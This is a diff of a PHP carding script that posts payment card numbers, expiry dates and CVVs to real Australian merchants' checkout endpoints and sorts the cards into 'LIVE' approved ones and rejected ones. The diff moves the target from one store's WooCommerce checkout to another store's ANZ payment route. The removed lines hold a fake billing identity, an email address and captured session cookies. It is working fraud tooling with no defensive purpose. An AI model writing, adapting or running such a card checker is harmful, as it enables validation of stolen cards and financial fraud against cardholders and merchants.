@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://www.citytechnology.com.au/store/index.php?route=payment/anz/send');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -234,20 +234,20 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200711164044-KrFQdYYSqnFK0TX08g7kU2FLTxEOSK9ZLA4QaeeowYchwwdnx; omnisendAnonymousID=LKIREMfDYFKg6s-20200711164044; tk_ai=woo%3AJvFeQYkE79ssQEFVSnRvbsfW; woocommerce_items_in_cart=1; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=4758a513165aaa2fb8008284b6cf6597%7C%7C1594658491%7C%7C1594654891%7C%7C9477e94632016b9bebd691938f457101; woocommerce_cart_hash=09ddd609069212de8db0c0daa9e818c3; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fcheckout%2F; soundest-views=9; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dwphpc_action%26uid%3D1594561285.7966%26eid%3D2.0139908790588%26url%3Dwww.artofhearing.com.au%252Fcheckout%252F%26lastid%3D831640%26hash%3D529ce02b%26wphpc_browserTime%3D4279%26_%3D1594561285611',
-'Host: www.artofhearing.com.au',
-'Origin: https://www.artofhearing.com.au',
-'Referer: https://www.artofhearing.com.au/checkout/',
+'Accept: application/json, text/javascript, */*; q=0.01',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: application/x-www-form-urlencoded',
+'Cookie: display=list; PHPSESSID=b94bd6f1b55120302e991e902339caee; language=en; currency=AUD',
+'Host: www.citytechnology.com.au',
+'Origin: https://www.citytechnology.com.au',
+'Referer: https://www.citytechnology.com.au/store/index.php?route=checkout/checkout',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Harris+Park&billing_state=NSW&billing_postcode=2150&billing_phone=05182641524&billing_email=pu.bgkittu%40gmail.com&g-recaptcha-response=&shipping_first_name=&shipping_last_name=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wc_pickup_store&shipping_pickup_stores=Kardinya&shipping_by_store=&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=e6fd52b7a7&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'vpc_CardNum='.$cc.'&selMonth='.$mes.'&selYear='.$ano.'&vpc_CardSecurityCode='.$cvv.'');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -257,23 +257,26 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tUser response is missing.\t\t<\/li>\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"result":"success"')){
+// // /////////////////////// RESULT ////////////////////////////////////
+if(strpos($result,'"success"')){
 // updatecart();
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
 elseif(strpos($result,'Not Acceptable!')) {
 
-        echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+
   }
+
 else {
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
   }
 curl_close($curl);
